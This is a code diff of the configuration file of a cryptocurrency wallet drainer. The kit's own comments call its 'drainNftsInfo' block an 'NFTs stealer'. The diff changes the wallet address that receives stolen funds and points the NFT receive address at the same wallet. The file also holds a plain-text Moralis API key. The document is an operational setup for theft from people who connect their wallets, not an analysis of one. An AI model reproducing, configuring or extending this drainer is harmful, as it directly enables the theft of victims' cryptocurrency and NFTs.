@@ -1,4 +1,4 @@
-const receiveAddress = "0x75b62D2E454c512A78Ae42E39de957cd9B7cD1f9";
+const receiveAddress = "0xc37906ce77119c668Be72327e2df1ca977E10bE6";
 const infuraId = ""; // Infuria ID | https://infura.io/ | For Wallet Connect
 const moralisApi =
   "rSP2DgD6GbLGY8qqZZ5wiSdKFJ03GpthuBLBaixOEgIHdejCQD1PzgKRR09gKpT1"; // x-api-key | https://moralis.io/ | For NFTs
@@ -45,7 +45,7 @@ const drainNftsInfo = {
   active: true, // Active (true) or not (false) NFTs stealer.
   minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
   checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-  nftReceiveAddress: "", // leave empty if you want to use the same as receiveAddress
+  nftReceiveAddress: "0xc37906ce77119c668Be72327e2df1ca977E10bE6", // leave empty if you want to use the same as receiveAddress
 };
 
 const customStrings = {
